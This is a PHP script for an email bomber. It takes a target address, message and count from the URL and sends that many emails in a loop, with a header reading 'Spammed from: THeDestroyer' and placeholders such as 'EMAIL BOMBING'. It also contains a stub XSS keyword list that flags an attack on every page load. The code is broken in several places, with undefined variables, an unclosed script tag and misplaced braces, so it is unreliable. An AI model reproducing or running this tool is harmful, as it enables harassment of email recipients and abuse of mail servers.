<?php

function Sender(){
$target = $_GET['target'];
$subject = $_GET['subject'];
$message = $_GET['message'];
$sender = $_GET['sender'];
$amount = $_GET['amount'];

$IP = $_SERVER['REMOTE_ADDR'];
if(empty($header)){
  echo "<h2>Please enter an amount</h2>";
}
$headers = "Spammed from: THeDestroyer";
if(empty($amount)  || empty($target)){
  echo "<h2>Please enter an amount and target!</h2>";
}
if(isset($amount)){
  echo "<h1> Successfully sent $amount spam emails to $target</h1>";
}
for($i=0; $i <=$amount; $i++){
  mail($target, $subject,$message, $headers);
  mail($target, $subject,$message, $headers, $IP);
}
if(empty($message)){
  echo "<h2>Please enter a message you wish to spam</h2>";
}
time(); //work here more
if(empty($target)){
echo "<h2>Please enter an email you wish to spam</h2>";
echo "<script> document.innerHTML= \"<pre> Automatically sending 100 emails per minute</pre>\"";
for($i=0; $i <=$amount; $i++){
  $_SERVER ['HTTP_REFERER'];
  $autotarget = "&target=test@hotmail.com";
  $automessage = "&message=EMAIL BOMBING";
  $autosender = "&sender=hacker@hackersparadise.com";
  $autoheaders = "&header=BOMBER";
  mail($target, $subject,$message, $headers);
  echo "$_SERVER";
}
}
} // Sender function ends here
Sender();
function Displays(){
  $HTMLTAGS = "<html>\n\n<style>body{background: grey;}</style></html>";
}
function DetectXSS(){
  $array = array("<script>" , "<?php" , "<ScRiPt>"  , "onerror");
  echo "<h3>XSS ATTACK DETECTED</h3>";
}
DetectXSS();
Displays();
function Payloads(){
  $payload = $_POST['payload'];
  $namepyld = $_POST['name'];

  if(empty($payload)){
    echo "";
  }
  elseif(empty($namepyld)){
    echo "";
  }
}
if($amount >= 1000){
  echo "<script>alert('Are you sure that you wish to spam this much? May take longer');</script>";

if(empty($amount)){
  echo "<h1>Please enter an ammount!</h1>";
}
}
